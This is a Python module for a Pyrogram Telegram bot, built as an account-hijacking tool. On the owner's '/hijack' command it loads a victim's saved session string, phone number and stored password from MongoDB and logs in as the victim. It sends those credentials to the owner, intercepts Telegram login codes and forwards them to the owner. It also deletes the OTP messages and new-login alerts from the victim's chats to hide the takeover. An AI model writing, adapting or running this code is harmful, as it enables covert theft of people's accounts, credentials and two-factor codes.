from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.errors import FloodWait
from config import API_ID, API_HASH, OWNER_ID, MONGO_URI, MONGO_DB_NAME
from pymongo import MongoClient
import asyncio
from datetime import datetime
import pytz

# MongoDB setup
mongo_client = MongoClient(MONGO_URI)
db = mongo_client[MONGO_DB_NAME]
logged_in_users = db["logged_in_users"]

# Global states
active_userbot = None
pending_user_id = None

__all__ = ["setup_hijack_handlers", "active_userbot", "pending_user_id", "cleanup_userbot"]

async def cleanup_userbot():
    global active_userbot
    if active_userbot:
        try:
            await active_userbot.stop()
        except Exception as e:
            print(f"Error stopping userbot: {e}")
        active_userbot = None

async def is_session_alive(session_string):
    try:
        checker = Client(
            "session_checker",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await checker.connect()
        me = await checker.get_me()
        await checker.disconnect()
        return True, me
    except Exception as e:
        print(f"[Session Check Error] {e}")
        return False, None

def setup_hijack_handlers(app):
    @app.on_message(filters.command("hijack"))
    async def hijack_session(client: Client, message: Message):
        global active_userbot, pending_user_id

        if message.from_user.id != OWNER_ID:
            await message.reply("🚫 You are not my Owner 😎💻 Only the boss can use this command!")
            return

        if active_userbot:
            await message.reply("⚠️ A hijack session is already active. Use /cancel_hijack first.")
            return

        try:
            user_id_msg = await app.ask(
                chat_id=message.chat.id,
                text="📩 Please enter the user ID of the user you want to hijack:",
                filters=filters.text,
                timeout=60
            )

            if not user_id_msg.text.strip().isdigit():
                await message.reply("❌ Invalid user ID. Please provide a numeric user ID.")
                return

            user_id = int(user_id_msg.text.strip())

            if user_id == OWNER_ID:
                await message.reply("🙅‍♂️ Owner cannot be hijacked! You're the boss 😎👑")
                return

            pending_user_id = user_id
            user_session = logged_in_users.find_one({"user_id": user_id})

            if user_session and user_session.get("status") == "inactive":
                await message.reply("⚠️ User found but not logged in 🚫")
                pending_user_id = None
                return

            if not user_session or not user_session.get("session_string"):
                await message.reply("❌ User not found or not logged in.")
                pending_user_id = None
                return

            session_string = user_session["session_string"]
            saved_password = user_session.get("password", "N/A")

            is_alive, me = await is_session_alive(session_string)
            if not is_alive:
                await message.reply("❌ Session is not active or invalid.")
                pending_user_id = None
                return

            userbot = Client(
                f"userbot_{user_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_string,
                in_memory=True
            )

            await userbot.start()
            active_userbot = userbot

            user_info = f"""
✅ **Hijack Successful**
└ User ID: `{me.id}`
└ Name: `{me.first_name or 'N/A'}`
└ Username: @{me.username or 'N/A'}
└ Phone: `{user_session.get('phone_number', 'N/A')}`
└ Password: `{saved_password}`
            """

            await message.reply(user_info.strip())
            await message.reply("🕵️ Listening for OTPs and login notifications...")

            @userbot.on_message(filters.private)
            async def otp_listener(_, msg: Message):
                if "Login code:" in msg.text:
                    otp = msg.text.split(": ")[1].strip()
                    await client.send_message(
                        OWNER_ID,
                        f"🔐 OTP Intercepted: `{otp}`",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("Stop Hijack", callback_data="stop_hijack")]
                        ])
                    )
                    await msg.delete()
                elif "New login" in msg.text or "logged in" in msg.text:
                    await msg.delete()
                    await asyncio.sleep(60)
                    await cleanup_userbot()
                    await client.send_message(
                        OWNER_ID,
                        "🛑 Session auto-closed (login detected)",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("Start New Hijack", callback_data="start_hijack")]
                        ])
                    )

        except asyncio.TimeoutError:
            await message.reply("⏰ Timeout. You didn't reply in time.")
            pending_user_id = None
        except Exception as e:
            await message.reply(f"❌ Hijack failed: {str(e)}")
            await cleanup_userbot()
            pending_user_id = None

    @app.on_message(filters.command("cancel_hijack") & filters.user(OWNER_ID))
    async def cancel_hijack(_, message: Message):
        global active_userbot
        if not active_userbot:
            await message.reply("❌ No active hijack session.")
            return

        await cleanup_userbot()
        await message.reply("🛑 Hijack session terminated.")

    @app.on_callback_query(filters.regex("^stop_hijack$"))
    async def stop_hijack_callback(_, query):
        await cleanup_userbot()
        await query.message.edit_text("🛑 Hijack session stopped by Owner.")

    @app.on_callback_query(filters.regex("^start_hijack$"))
    async def start_hijack_callback(_, query):
        await query.message.edit_text("Please use /hijack command to start a new session.")
